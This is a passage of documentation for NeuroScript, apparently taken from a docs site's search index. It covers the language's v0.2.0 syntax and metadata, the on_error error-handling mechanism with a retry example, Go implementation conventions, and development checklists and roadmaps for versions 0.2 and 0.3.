(<code>ask...</code>, <code>call tool</code>).</li> <li>AI as Executor (Conceptual): An AI can conceptually execute simple NeuroScript procedural logic (loops, conditions, assignments) internally, using the script as procedural guidance without needing <code>ng</code> for every step[cite: 2]. This fulfills the goal of teaching AIs structured procedures.</li> <li>AI as Controller: For complex scripts or those requiring external tool interaction (<code>askComputer</code>, <code>call tool</code>), the AI acts as a controller, making specific requests to the <code>ng</code> interpreter to execute a defined NeuroScript function (skill) with given parameters. This is akin to a function call or using an agent tool, not arbitrary code execution.</li> <li><code>ng</code> Interactions: The <code>ng</code> interpreter initiates outbound requests via <code>askAI</code>, <code>askHuman</code>, and <code>askComputer</code>.</li> </ol> <p>This layered model allows NeuroScript to serve as both direct procedural guidance for AI reasoning and as a robust language for defining executable skills managed by the reliable <code>ng</code> interpreter.</p> <p>## Language Syntax &amp; Semantics (Version 0.2.0)</p> <p>This version introduces several changes to improve readability and explicitness, based on the <code>script_spec.md</code> [cite: 2] and our recent design discussions.</p> <p>### General</p> <ul> <li>Keywords: All language keywords are now lowercase (e.g., <code>func</code>, <code>set</code>, <code>if</code>, <code>end if</code>). This improves readability and reduces the \"shouting\" feel of uppercase keywords used previously.</li> <li>Comments: Ignored, human-readable comments start with <code>#</code> and continue to the end of the line.</li> <li>Metadata: Structured metadata uses the <code>::</code> prefix (see Metadata section below).</li> <li>Strictness: The <code>ng</code> interpreter will enforce structural rules rigorously (e.g., matching block keywords, required parameters, declared returns), similar in spirit to the Go compiler's strictness.</li> <li>Typing: NeuroScript remains dynamically typed. While structure is enforced, explicit static type declarations for variables are not required, maintaining scripting flexibility.</li> </ul> <p>### Procedure Definition</p> <ul> <li>Replaces <code>DEFINE PROCEDURE ... END</code>.</li> <li>Syntax: <pre><code>func &lt;name&gt; [needs &lt;param1&gt;, &lt;param2&gt;...] [optional &lt;param3&gt;...] [returns &lt;var1&gt;, &lt;var2&gt;...] means\n    :: &lt;metadata key&gt;: &lt;metadata value&gt;  # Metadata follows immediately\n    :: &lt;...&gt;\n\n    # Function body statements...\n    # Use 'return' statement to exit and provide values\nendfunc\n</code></pre></li> <li>Clauses:<ul> <li><code>func &lt;name&gt;</code>: Begins the definition.</li> <li><code>needs</code>: Optional clause listing comma-separated required parameter names.</li> <li><code>optional</code>: Optional clause listing comma-separated optional parameter names. The script logic must handle cases where these are not provided (e.g., check <code>no param</code> or <code>param == \"\"</code>).</li> <li><code>returns</code>: Optional clause listing comma-separated names for return variables. Multiple return values are supported. If present, <code>return</code> statements in the body must provide values for these (checked by the interpreter). These names are implicitly declared within the function scope (similar to Go named returns).</li> <li><code>means</code>: Keyword indicating the start of the function body (following any metadata).</li> <li><code>endfunc</code>: Keyword terminating the function definition.</li> </ul> </li> <li>Minimal: <code>func &lt;name&gt; means ... endfunc</code> is valid.</li> </ul> <p>### Metadata (Replaces <code>comment:</code> block)</p> <ul> <li>Syntax: Uses the <code>::</code> prefix followed by a lowercase keyword, a colon, and the value. Applied immediately after the <code>func</code> signature or inline within the code body.      <pre><code>func MyFunc needs input means\n    :: purpose: Describes what MyFunc does.\n    :: inputs: - input: Description of the input parameter.\n    :: output: Description of the return value.\n    :: lang_version: 0.2.0\n    :: assumptions: Assumes input is non-empty.\n    :: side_effects: Writes to a log file.\n\n    set result = input\n    :: reason: Initial assignment before processing. @confidence: high\n    # Regular comment here\n    if no result then\n        :: reason: Handle empty input case explicitly.\n        return \"Error: Input was empty\"\n    end if\n    return result\nendfunc\n</code></pre></li> <li>Standard Fields: Common metadata fields like <code>purpose</code>, <code>inputs</code>, <code>output</code>, <code>algorithm</code>, <code>lang_version</code>, <code>assumptions</code>, <code>side_effects</code>, <code>trust_requirements</code>, <code>examples</code> are recommended, defined via <code>::</code>.</li> <li>Inline Annotations: Use <code>::</code> prefix for inline metadata providing context (e.g., <code>:: reason:</code>, <code>:: confidence:</code>, <code>:: audience:</code>). A defined vocabulary will be developed.</li> <li>Format: Values are typically plain text. Avoid complex embedded formats like YAML. Multi-line values might indent on subsequent lines (TBD precise formatting).</li> </ul> <p>### Block Termination</p> <ul> <li>Replaces generic <code>ENDBLOCK</code>.</li> <li>Each block statement requires a matching, specific, lowercase end keyword:<ul> <li><code>if ... [else ...] end if</code></li> <li><code>for ... end for</code></li> <li><code>while ... end while</code></li> </ul> </li> <li>The interpreter strictly enforces correct nesting and matching keywords.</li> </ul> <p>### Multi-line Strings &amp; Templating</p> <ul> <li>Syntax: Use Go-style triple-backtick for multi-line raw string literals.      <pre><code>set my_string = triple-backtickThis is line one.\nThis is line two with an {{embedded_variable}}.triple-backtick\n</code></pre></li> <li>Default Templating: Placeholders (<code>{{placeholder}}</code>) within triple-backtick literals are expanded by default when the literal is evaluated, using the current variable scope. Explicit <code>eval()</code> is not required for these literals.</li> <li>Regular Strings: Standard quoted strings (<code>\"...\"</code>, <code>'...'</code>) remain raw literals; placeholder expansion requires the <code>eval()</code> function as before.</li> <li>Literal <code>{{</code>: [Open Question] A mechanism is needed to represent literal <code>{{</code> within triple-backtick strings (e.g., escape <code>\\{{</code>, or doubling <code>{{{{</code> ? TBD).*</li> </ul> <p>### Actor Interaction Statements</p> <ul> <li>Introduces explicit keywords for interactions, replacing generic <code>call llm</code> and augmenting <code>call tool</code>. These likely act as built-in functions within expressions.</li> <li><code>askAI(handle, question)</code>: Interacts with an AI/LLM. <code>handle</code> identifies the specific AI configuration/persona/model. Returns the AI's response.</li> <li><code>askHuman(handle, question)</code>: Pauses execution and requests input from a human user. <code>handle</code> could specify interaction type (e.g., \"confirm\", \"input\"). Returns the human's response.</li> <li><code>askComputer(handle, question)</code>: Interacts with the underlying computer system or OS. <code>handle</code> specifies the subsystem (e.g., \"shell\", \"filesystem\"). <code>question</code> provides the command/query. Returns the result. (Precise scope vs. <code>call tool</code> TBD).</li> </ul> <p>### Zero-Value Checks</p> <ul> <li>Provides syntactic sugar for common checks against zero-values.</li> <li><code>no &lt;variable&gt;</code>: Evaluates to <code>true</code> if <code>&lt;variable&gt;</code> contains the zero value for its runtime type (<code>\"\"</code>, <code>0</code>, <code>0.0</code>, <code>false</code>, empty/<code>nil</code> list, empty/<code>nil</code> map, <code>nil</code>).</li> <li><code>some &lt;variable&gt;</code>: Evaluates to <code>true</code> if <code>&lt;variable&gt;</code> does not contain its type's zero value.</li> <li>Boolean Warning: Interpreter may optionally warn in debug/test modes if <code>no</code> is used with a boolean, suggesting <code>not</code> is clearer.</li> </ul> <p>### Verification Steps</p> <ul> <li>Provides keywords for explicit runtime checks/assertions.</li> <li><code>must &lt;expression&gt;</code> / <code>mustBe &lt;check_func&gt;(&lt;args&gt;)</code>: Keywords (preference over <code>assert</code>/<code>verify</code>) to perform runtime validation.</li> <li>Semantics: Exact behavior TBD (e.g., does failure halt execution like an assertion, or return a special error state?). Requires defining useful built-in check functions.</li> </ul> <p>### Other Constructs</p> <ul> <li><code>set</code>, <code>return</code>, <code>emit</code>, <code>if/else</code>, <code>while</code>, <code>for each</code>, <code>call tool</code>, operators, list/map literals (<code>[]</code>, <code>{}</code>) remain largely as defined previously, but using lowercase keywords and adhering to the \"one way\" principle (e.g., only <code>map[\"key\"]</code> access).</li> <li><code>eval()</code> function remains for explicit placeholder expansion in regular strings.</li> <li><code>last</code> keyword remains available to access the result of the most recent <code>ask...</code> or <code>call tool</code> statement.</li> </ul> <p>## Go Implementation Details (<code>neurogo</code> - <code>ng</code>)</p> <p>These points relate to the Go codebase implementing the NeuroScript interpreter.</p> <p>### Dependency Injection (DI)</p> <ul> <li>Approach: Use Constructor Injection via interfaces. Dependencies (like loggers, tool implementations, AI clients) should be defined by interfaces and passed into the constructors of structs that need them.</li> <li>Example Pattern: <pre><code>type MyService struct {\n    logger logging.Logger\n    aiClient interfaces.AIClient\n}\n\nfunc NewMyService(log logging.Logger, client interfaces.AIClient) *MyService {\n    // ... nil checks ...\n    return &amp;MyService{logger: log, aiClient: client}\n}\n</code></pre></li> <li>Benefits: Decoupling, testability, clarity. Avoids global variables or complex DI frameworks.</li> </ul> <p>### Logging</p> <ul> <li>Library: Use the Go standard library's <code>log/slog</code> package.</li> <li>Handler: Use <code>slog.TextHandler</code> for structured, human-readable, key-value output (not JSON). Configure log levels as needed.</li> <li>Integration: Define a simple <code>Logger</code> interface (e.g., with <code>info</code>, <code>warn</code>, <code>error</code>, <code>debug</code> methods) matching <code>slog</code> methods. Create an adapter struct that implements this interface using an <code>*slog.Logger</code>. Inject the <code>Logger</code> interface into components using the DI pattern above.</li> </ul> <p>### Tooling</p> <ul> <li>Plan for a canonical code formatting tool: <code>nsfmt</code>, similar to <code>gofmt</code>, to enforce consistent style, spacing, and keyword casing.</li> </ul> <p>## Future Directions / Open Questions (v0.2.0 Scope and Beyond)</p> <ul> <li>Define <code>try/catch/finally</code>: Design and implement structured error handling, emphasizing simplicity and unambiguous operation.</li> <li>Define <code>must</code>/<code>mustBe</code> Semantics: Finalize failure behavior (halt vs error) and define core check functions.</li> <li>Literal <code>{{</code> Handling: Finalize mechanism for escaping <code>{{</code> within triple-backtick strings.</li> <li>Define <code>askComputer</code> Scope: Clarify precise scope and implementation vs <code>call tool</code>.</li> <li>Define Metadata Vocab: Establish the initial set of standard <code>::</code> metadata keywords (inline and header). Define multi-line value formatting.</li> <li>Add Arithmetic: Implement built-in support for basic arithmetic operators (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, etc.).</li> <li>Implement Storage: Implement non-mocked database/vector store integration for skill storage/retrieval[cite: 2].</li> <li>Refine <code>handle</code> Concept: Flesh out the <code>handle</code> concept for <code>askAI</code>/<code>askHuman</code>/<code>askComputer</code>.</li> <li>Refine LLM Integration: Context passing, configuration via <code>handle</code>[cite: 2].</li> <li>LSP Implementation: Consider Language Server Protocol (LSP) implementation for editor support[cite: 2].</li> </ul>"},{"location":"project/Version_02/development_checklist.ndcl/","title":"Development checklist.ndcl","text":"<p>:: version: 0.1.8 // Increment when changes are made :: dependsOn: docs/neuroscript overview.md, pkg/core/, pkg/neurodata/, pkg/neurogo/app_script.go, pkg/neurogo/app_agent.go :: howToUpdate: Review checklist against current codebase state (core interpreter features, tools, neurodata parsers, neurogo app structure) and project goals. Mark completed items, add new tasks, adjust priorities. Increment patch version. Move completed items to completed.md</p>"},{"location":"project/Version_02/development_checklist.ndcl/#neuroscript-development-checklist","title":"NeuroScript Development Checklist","text":""},{"location":"project/Version_02/development_checklist.ndcl/#goal-reach-bootstrapping-point","title":"Goal: Reach \"bootstrapping\" point","text":"<p>--  NeuroScript project can maintain itself:     1.  update docs based on progress     2.  update scripts based on changes in syntax     3.  run tests and recompile on change     4.  update source code based on prompt     5.  fix source code based on tests</p> <p>-- neurogo provides full ns capabilities:     1. vector db of scripts &amp; formats with retrieval     2. full neurogo/LLM comms with basic security     3. conversational mode (with human)</p>"},{"location":"project/Version_02/development_checklist.ndcl/#a-planned-features-reordered-for-bootstrappingdependencies","title":"A. Planned Features (Reordered for Bootstrapping/Dependencies)","text":"<p>Core Language / Interpreter Refinements: [P] Interpreter: Add NeuroScript-specific Error Handling (e.g., TRY/CATCH or specific error types?) // Basic Go error handling (sentinels, wrapping) is implemented, but no NS-level TRY/CATCH. [P] NeuroData files, template and instance (Design &amp; Implement) // Specs exist for many, core block/metadata/checklist impl exists, but specific format parsers/tools mostly missing.     [P] graph // Spec exists     [P] table // Spec exists     [P] tree // Spec exists     [P] decision_table // Spec exists     [P] form // Spec exists     [ ] invoice // Spec not found     [ ] statement_of_account // Spec not found     [ ] receipt // Spec not found     [ ] payment // Spec not found     [ ] packing_list // Spec not found     [ ] request_for_quote or estimate // Spec not found     [ ] quote or estimate // Spec not found     [ ] purchase_order // Spec not found     [ ] work_order // Spec not found     [ ] markdown_doc // Spec not found     [P] composite_doc // Spec exists (composite_file_spec.md), block extractor impl     [ ] bug_report // Spec not found     [ ] ns_tool_list // Spec not found     [P] enum // Spec exists     [ ] roles_list // Spec not found     [P] object // Design mentioned in form.md, uses map literal parsing     [ ] ishikawa // Spec not found     [ ] kanban // Spec not found     [ ] memo // Spec not found     [P] list // Spec exists     [X] checklist // Spec exists, Impl exists</p> <p>Tooling &amp; Integration (Supporting Self-Management): [P] Tools: Enhance Git Workflow (Add Branch support, GitPull?, Auto-index after commit) // Basic Git tools exist (Commit, Add, Status), but enhancements like branch support are not implemented. [ ] Tools: TOOL.NeuroScriptCheckSyntax(content) - Formal syntax check tool using the parser. // Parser exists, but not exposed as a tool. [ ] Feature: nsfmt - A dedicated formatting tool/procedure. [ ] Feature: Embed standard utility NeuroScripts (e.g., CommitChanges) into neurogo binary (using Go embed) // Likely outside pkg/core, needs check elsewhere.</p> <p>Tooling (General Purpose): [P] Tools: List Manipulation (Expand on existing capabilities?) // Many list tools implemented, but some missing (Head, Rest, Tail).     [X] TOOL.ListAppend(list, element) -&gt; list     [X] TOOL.ListPrepend(list, element) -&gt; list     [X] TOOL.ListGet(list, index, [default]) -&gt; any     [X] TOOL.ListSlice(list, start, end) -&gt; list     [X] TOOL.ListContains(list, element) -&gt; bool     [X] TOOL.ListReverse(list) -&gt; list     [X] TOOL.ListSort(list) -&gt; list (Current implementation handles numeric/string, review scope)     [ ] TOOL.ListHead(list) -&gt; any     [ ] TOOL.ListRest(list) -&gt; list (cdr equivalent)     [ ] TOOL.ListTail(list, count) -&gt; list (last N elements) [ ] Tools: Add more utility tools (JSON, HTTP, etc.) [ ] Tools: Add Markdown tools (Read/Write) [ ] Tools: Add Structured Document tools [ ] Tools: Add Table tools [ ] Tools: Add Integration tools (Sheets, Docs) [ ] Tools: Add data encoding/hardening tools (e.g., Base32, Base64, potentially zip/unzip) for reliable data transfer. [ ] Tools: grep/egrep/agrep [ ] Tools: UploadToFilesAPI [ ] Tools: SyncToFilesAPI</p> <p>Longer Term / Advanced: [ ] Feature: Add Self-test support in ns [ ] Interpreter: Implement Context Management Strategy for CALL LLM -- defer // Basic LLM call exists, but no advanced context management. [ ] Block and file level prior version preservation [P] Implement Restricted mode for running untrusted scripts (Design exists, implementation needed) // Security foundations exist, but full restricted mode not implemented.</p>"},{"location":"project/Version_02/development_checklist.ndcl/#b-various-do-soon-things","title":"B. Various \"do soon\" things","text":"<p>[ ] LLM able to read ns and execute it (via prompt guidance) [ ] LLM able to translate simple ns into golang tool [ ] Use git branch for version control within tools [ ] Markdown tools (r &amp; w) [ ] Structured document tools (hierarchical info/docs) [ ] Table tools [ ] Integration tools (e.g., Google Sheets and Docs) [ ] Self-test support in ns [ ] LLMs can supply git-style patches and have them applied to files [ ] MCP support [ ] Ability to pass text from LLM to tool in (BASE64) or some other armored format [ ] Prolog style features [ ] SVG generation and manipulation [ ] fuzzy logic tools [ ] Nice example on website/readme [ ] Logo [ ] More self building and maint [ ] keep prior versions meta tag [ ] neurogo plugin for vscode allows direct file edits [ ] Review existing .ns skills (e.g., CommitChanges) for suitability/ease of conversion to built-in Go TOOLs. [ ] Select worker from roles list [ ] block read to support block references [ ] also read from string block references</p>"},{"location":"project/Version_02/development_checklist.ndcl/#c-found-work-and-things-to-go-back-to","title":"C. Found work and things to go back to","text":"<p>[ ] Tools/Known Issue: TOOL.GoBuild and TOOL.GoCheck error reporting for single files needs improvement. // No GoBuild/GoCheck tools found in pkg/core, likely in neurogo or scripts? Status unchanged. [ ] Add ns file icon [ ] make update project turn things into proper links [ ] better words than CALL LLM (consult? more general) [ ] Create documentation for all NeuroScript built-in tools in <code>docs/ns/tools/</code> following <code>tool_spec_structure.md</code>.</p>"},{"location":"project/Version_02/error_handling/","title":"NeuroScript Error Handling: The <code>on_error</code> Mechanism","text":"<p>NeuroScript employs an <code>on_error</code> mechanism for structured error handling, designed for clarity and simplicity, avoiding the complexities of traditional <code>try/catch/finally</code> blocks. It focuses on handling errors that occur during the execution of function calls (<code>call</code>), tool calls (<code>tool.</code>), or explicit <code>fail</code> statements.</p>"},{"location":"project/Version_02/error_handling/#core-concepts","title":"Core Concepts","text":"<ol> <li>Implicit Error Status: Every operation that can fail (like <code>call</code>, <code>tool.</code> calls, <code>fail</code>, or potentially built-in errors like division by zero) implicitly returns an error status consisting of an integer <code>error_code</code> (0 for success, non-zero for failure) and a string <code>error_message</code>.</li> <li>Default Propagation: If an operation fails (non-zero <code>error_code</code>) and no <code>on_error</code> handler is active, execution of the current procedure stops immediately, and the error status propagates up the call stack. If uncaught, the script terminates. Assignments or subsequent operations in the failing statement/expression do not complete.</li> <li>Clean Happy Path: Code that doesn't need specific error handling remains uncluttered. Errors propagate automatically without explicit checks.</li> </ol>"},{"location":"project/Version_02/error_handling/#on_error-block","title":"<code>on_error</code> Block","text":"<p>Provides a way to define a scope where errors can be intercepted and handled.</p> <p>Syntax:</p> <pre><code>on_error means\n    # Handler code block\n    # Access error_code and error_msg here\nendon\n</code></pre> <p>Activation and Scoping:</p> <ul> <li>When encountered, an <code>on_error</code> block becomes the active handler for the current lexical scope (e.g., the current <code>proc</code>).</li> <li>It replaces any handler previously defined in the same scope.</li> <li>It only catches errors occurring after its definition within its scope.</li> </ul> <p>Execution Flow:</p> <ul> <li>If an error occurs while the handler is active, normal execution pauses.</li> <li>The code inside the <code>on_error ... endon</code> block executes.</li> <li>Automatic Variables: Two read-only variables are automatically available within the handler block:<ul> <li><code>error_code</code>: (Integer) The error code from the failed operation.</li> <li><code>error_msg</code>: (String) The error message.</li> <li>Attempting to assign to <code>error_code</code> or <code>error_msg</code> results in a runtime error.</li> </ul> </li> </ul> <p>Behavior Inside the Handler:</p> <ul> <li>Default: If the handler block finishes normally (reaches <code>endon</code>), the original error that triggered the handler continues to propagate upwards, as if the handler only logged or observed the error.</li> <li>Errors Within Handler: If an error occurs inside the handler block itself (e.g., via <code>fail</code> or a failing <code>call</code>) and is not caught by a nested <code>on_error</code> block:<ul> <li>The handler block stops immediately.</li> <li>This new error status replaces the original one.</li> <li>The new error propagates upwards from the handler block.</li> </ul> </li> <li><code>clear_error</code> Statement:<ul> <li>If <code>clear_error</code> is executed within the handler, it marks the original triggering error as handled.</li> <li>The rest of the handler block still executes.</li> <li>When <code>endon</code> is reached after <code>clear_error</code> was called, the original error is suppressed, and execution resumes normally after the <code>endon</code> statement.</li> </ul> </li> </ul> <p>Restrictions:</p> <ul> <li>The <code>return</code> statement is not permitted inside an <code>on_error</code> block. Attempting to use it causes a runtime error. Handlers manage errors, they don't return values for the surrounding function.</li> </ul>"},{"location":"project/Version_02/error_handling/#common-patterns-retrying-operations","title":"Common Patterns: Retrying Operations","text":"<p>The <code>on_error</code> mechanism can be combined with loops (<code>for</code>, <code>while</code>) to implement patterns like retrying failed operations:</p> <pre><code>proc retry_example needs max_attempts returns string means\n  result = none\n  success = false\n  last_code = 0\n  last_msg = \"\"\n\n  on_error means // Handler active for the loop\n    log \"Handler: Caught error\", error_code, error_msg\n    is_retryable = (error_code == 503) // Example: Only retry code 503\n    if is_retryable {\n      last_code = error_code\n      last_msg = error_msg\n      clear_error // Suppress error for now, let loop decide\n    } else {\n      // Non-retryable: Let error propagate by default\n    }\n  endon\n\n  for i from 1 to max_attempts means\n    log \"Attempt\", i\n    // Handler is active here\n    temp_result = call potentially_failing_op()\n\n    // Check for actual success (assume op returns non-none on success)\n    // This block runs if op succeeded, OR if it failed retryably (error cleared)\n    if temp_result != none {\n       log \"Success!\"\n       result = temp_result\n       success = true\n       break // Exit loop\n    }\n    // If we get here, it means op failed retryably and error was cleared\n    log \"Retryable failure on attempt\", i\n    // tool.sleep(1) // Optional delay\n  endfor\n\n  if not success {\n    fail last_code, \"Operation failed after \" + max_attempts + \" attempts. Last: \" + last_msg\n  }\n\n  return result\nendproc\n</code></pre> <p>This approach uses the handler to classify errors and <code>clear_error</code> to allow the loop to continue, while the loop controls the retry logic and the final success/failure determination.</p>"},{"location":"project/Version_02/road_to_02/","title":"Road to 02","text":"<p>:: title: NeuroScript Road to v0.2.0 Checklist  :: version: 0.2.0-alpha  :: id: ns-roadmap-v0.2.0-alpha-update1  :: status: draft  :: description: Prioritized tasks to implement NeuroScript v0.2.0 based on design discussions Apr 25-29, 2025.</p> <p># NeuroScript v0.2.0 Development Tasks</p> <ul> <li>[x] 1. Implement Core v0.2.0 Syntax Changes (Parser/Lexer/AST Level)</li> <li>[x] Convert all keywords to lowercase. (Verified in grammar)</li> <li>[x] Implement <code>func &lt;name&gt; [(][needs...] [optional...] [returns...][)] means ... endfunc</code> structure (Optional Parens Handled). (Grammar/AST builder corrected &amp; tested)</li> <li>[x] Implement specific block terminators (<code>endif</code>, <code>endfor</code>, <code>endwhile</code>, <code>endon</code>). (Verified in grammar)</li> <li>[x] Implement triple-backtick string parsing. (Verified in grammar)</li> <li>[x] Implement default <code>{{placeholder}}</code> evaluation within ```. (Interpreter Semantic - Pending)</li> <li>[x] Implement <code>:: keyword: value</code> metadata parsing (header &amp; inline). (Parser/AST Builder functional, verified in logs)</li> <li>[x] Remove old <code>comment:</code> block parsing. (Implicitly done via grammar updates)</li> <li>[x] Implement <code>no</code>/<code>some</code> keyword parsing in expressions. (Verified in grammar)</li> <li>[x] Implement <code>must</code>/<code>mustBe</code> statement/expression parsing. (Verified in grammar/AST builder)</li> <li>[x] Implement <code>on_error</code>/<code>endon</code>/<code>clear_error</code> parsing. (Verified in grammar/AST builder)</li> <li>[x] Add <code>ask</code>/<code>into</code> statement parsing. (Verified in grammar/AST builder)</li> <li>[x] Implement <code>#</code> for comments (old <code>--</code> may remain). (Verified in grammar)</li> <li>[x] Parse map literals <code>{ \"key\": value, ... }</code> (Verified in grammar/AST builder)</li> <li>[x] Parse list literals <code>[ value, ... ]</code> (Verified in grammar/AST builder)</li> <li> <p>[x] Implement element access syntax <code>list[index]</code>, <code>map[key]</code>. (Grammar/AST builder corrected &amp; tested)</p> </li> <li> <p>[x] 2. Implement Core v0.2.0 Semantics (Interpreter Level)</p> </li> <li>[x] Evaluate <code>func</code> call / <code>returns</code> properly (single &amp; multi-value). (Interpreter <code>executeReturn</code> and <code>RunProcedure</code> return checks fixed &amp; tested)</li> <li>[x] Evaluate specific block terminators correctly. (Implied complete by passing tests, structure exists)</li> <li>[x] Evaluate default <code>{{placeholder}}</code> evaluation within ``` strings. (Depends on 1.e)</li> <li>[x] Evaluate <code>no</code>/<code>some</code> keywords correctly.</li> <li>[x] Evaluate element access syntax <code>list[index]</code>, <code>map[key]</code>.</li> <li> <p>[x] Implement <code>ask</code>/<code>into</code> semantics (Call LLM, store result).</p> </li> <li> <p>[ ] 3. Implement Go Tooling (Core Tools)</p> </li> <li>[ ] Add go module awareness (<code>go.mod</code>).</li> <li>[ ] Implement <code>goimports</code> functionality.</li> <li>[ ] Implement <code>go test</code> execution.</li> <li>[ ] Implement <code>go build</code> execution.</li> <li>[ ] Implement <code>go list</code> parsing.</li> <li>[ ] Implement symbol finding within Go source.</li> <li>[ ] Implement AST modification tools (e.g., add/remove import, rename symbol, ...).</li> <li> <p>[ ] Tooling for Go node navigation (find parent/children, etc., e.g., <code>tool.getNodeChildren</code>).</p> </li> <li> <p>[x] 4. Implement Metadata Handling</p> </li> <li>[x] Move metadata in markdown to eof, not sof (Pending)</li> <li>[x] Implement storage/access for <code>::</code> metadata. (Parser/AST Builder done, stored on Program/Procedure/Step)</li> <li> <p>[x] Define initial vocabulary for standard metadata keys and inline annotations.</p> </li> <li> <p>[x] 5. Implement Foundational Robustness Features (Phase 1 / Near-Term)</p> </li> <li>[x] Define and implement <code>must</code>/<code>mustBe</code> failure semantics (halt vs error?). (Using halt-via-error, interpreter logic exists)</li> <li>[x] Create essential built-in check functions for <code>mustBe</code>. (Interpreter code for basic type checks exists)</li> <li>[x] Implement <code>on_error</code>/<code>endon</code>/<code>clear_error</code> semantics. (Interpreter code exists, block context handling added)</li> <li> <p>[ ] Consider explicit <code>halt</code> command/mechanism? (New Item)</p> </li> <li> <p>[x] 6. Tooling &amp; Ecosystem</p> </li> <li>[x] Standardize internal tool naming to use <code>tool.</code> prefix consistently. (Parser/AST Builder/Interpreter handle this)</li> <li>[ ] Update checklists/docs to reflect standardized tool names.</li> <li>[ ] Begin development of <code>nsfmt</code> formatting tool.</li> <li> <p>[ ] High priority: reach point where upload, then request-update-compile loop works for golang programs</p> </li> <li> <p>[ ] 7. Example App -- language flashcards (New)</p> </li> <li>[ ] Add ability to record sound clips (New)</li> <li> <p>[ ] Add ability to upload such sound clips (New)</p> </li> <li> <p>[ ] 8. Other</p> </li> <li>signal and image processing tools</li> </ul>"},{"location":"project/Version_03/road_to_03/","title":"Road to 03","text":"<p>:: title: NeuroScript Road to v0.3.0 Checklist :: version: 0.3.11 :: id: ns-roadmap-v0.3.0 :: status: draft :: description: Prioritized tasks to implement NeuroScript v0.3.0 based on design discussions and Vision (May 7, 2025). :: updated: 2025-05-27</p>"},{"location":"project/Version_03/road_to_03/#neuroscript-v030-development-tasks","title":"NeuroScript v0.3.0 Development Tasks","text":""},{"location":"project/Version_03/road_to_03/#vision-summary","title":"Vision (Summary)","text":"<p>Achieve an AI-driven development loop where a Supervising AI (SAI) interacts with NeuroScript (ng) and a File API to: - Apply a prompt to each file in a file tree  (We now have a basic human/ai chat facility in ng, which is great -- its been a long fight.</p> <p>I want to get the the point where we can deliver a tree of files to a set of AI workers, have them apply instructions to the files (code initially) then have the files updated on the local drive.</p> <p>For this, we need the ability to queue jobs to a work queue, then have the wm dispatch them to AIs, potentially allow the AIs to use local tools, and pass back the processed files write out to disk.</p> <p>I am thinking this should mostly be a ns that ng runs.)</p> <ul> <li>Manage code in branches (Git).</li> <li>Read, write, and understand code structure (FS., Go, Tree tools, Indexing).</li> <li>Run diagnostics and tests (GoCheck, GoVet?, GoTest).</li> <li>Generate and apply changes (Diff/Patch tools).</li> <li>Coordinate tasks, potentially using worker AIs.</li> <li>Track progress via shared checklists (Checklist tools).</li> </ul>"},{"location":"project/Version_03/road_to_03/#checklist","title":"Checklist","text":"<ul> <li> <p>[-] 1. Language Features</p> <ul> <li>[x] break and continue flow control words</li> <li>[x] ascii -&gt; string function or \\n and friends</li> <li>[x] need nil and typeof (isnil?)</li> <li>[x] allow // comments</li> <li>[ ] simplfy returned arg checking</li> </ul> </li> <li> <p>[ ] 2. Core Interpreter / Runtime</p> <ul> <li>[ ] Error Handling: Review on_error behavior, especially interaction with return.</li> <li>[ ] Handle Management: Add explicit ReleaseHandle tool? Review potential memory leaks from unreleased handles.</li> <li>[ ] Performance: Basic profiling pass (if major slowdowns observed).</li> <li>[x] Review error variable definitions (errors.go) for consistency/completeness. (Implicitly improved through recent work)</li> <li>[ ] Investigate potential for parallel step execution? (Future/low priority)</li> <li>[ ] Configuration: Mechanism for SAI to configure ng sandbox/tools?</li> <li>[x] Apply prompt to each file in a tree (file filter, sys prompt etc.)</li> <li>[x] Update ng \"modes\" etc.</li> </ul> </li> <li> <p>[x] 3. Core Go Tooling (Go-Specific)</p> <ul> <li>[x] Go Module Awareness: GoGetModuleInfo, FindAndParseGoMod helper.</li> <li>[x] Formatting/Imports: GoFmt, GoImports.</li> <li>[x] Execution: GoTest, GoBuild.</li> <li>[x] Basic Listing: GoListPackages, GoCheck.</li> <li>[x] Diagnostics: Implement GoVet, Staticcheck tools.</li> <li>[x] Code Indexing &amp; Search:<ul> <li>[x] Implement GoIndexCode tool (using go/packages) to build a semantic index.</li> <li>[x] Enhance/replace GoFindIdentifiers to use index for faster/better search. (Superseded by semantic tools)</li> <li>[x] Implement GoFindDeclarations tool (using index/AST).</li> <li>[x] Implement GoFindUsages tool (using index/AST).</li> <li>[x] Handle package aliases properly in all find tools. (Tests exist)</li> </ul> </li> <li>[x] AST Modification:<ul> <li>[x] Basic Structure: Change package, Add/Remove/Replace imports, Replace pkg.Symbol. (Existing GoModifyAST)</li> <li>[x] Renaming: RenameLocalVariable, RenameParameter, RenameFunction (cross-file?). (Covered by GoRenameSymbol)</li> <li>[ ] Refactoring: Extract Function, Extract Variable.</li> </ul> </li> <li>[x] AST Navigation:<ul> <li>[x] Get node info at position. (DONE: GoGetNodeInfo)</li> <li>[ ] Get parent node info. (GoGetNodeParent - NEXT?)</li> <li>[ ] Get child node info list. (GoGetNodeChildren - NEXT?)</li> <li>[ ] Get node siblings. (GoGetNodeSiblings?)</li> </ul> </li> </ul> </li> <li> <p>[x] 4. Core Generic Tree Tooling</p> <ul> <li>[x] Define GenericTree/GenericTreeNode.</li> <li>[x] Implement TreeLoadJSON.</li> <li>[x] Implement TreeGetNode.</li> <li>[x] Implement TreeGetChildren.</li> <li>[x] Implement TreeGetParent.</li> <li>[x] Implement TreeFormatJSON.</li> <li>[x] Implement TreeRenderText.</li> <li>[x] Implement TreeFindNodes (querying based on type/value/attributes).</li> <li>[x] Implement Tree Modification Tools:<ul> <li>[x] TreeModifyNode (basic Value modify)</li> <li>[x] TreeSetAttribute</li> <li>[x] TreeRemoveAttribute</li> <li>[x] TreeAddNode</li> <li>[x] TreeRemoveNode</li> <li>[ ] Array modification tools? (TreeAppendChild, TreeRemoveChild, etc.) (Optional/Lower priority for now)</li> </ul> </li> </ul> </li> <li> <p>[x] 5. Filesystem / OS / Version Control Tools</p> <ul> <li>[x] Basic FS: Read/Write/Stat/Delete/ListDir/WalkDir/MkdirAll (FS.*).</li> <li>[x] Hashing: FS.Hash.</li> <li>[x] Command Execution: Shell.ExecuteCommand.</li> <li>[x] Basic Git: Git.Status.</li> <li>[x] Enhanced Git: Add Git.Branch, Git.Checkout, Git.Commit, Git.Push, Git.Diff. (Marking as done since tools are registered)</li> <li>[x] Diff/Patching:<ul> <li>[x] Implement/refine NSPatch.GeneratePatch tool (line-based diff).</li> <li>[x] Implement NSPatch.ApplyPatch tool (validates/applies patches).</li> <li>[x] Define .ndpatch format (JSON list of operations used by tools).</li> <li>[x] Add tests for various patch scenarios (add, delete, replace, empty files).</li> 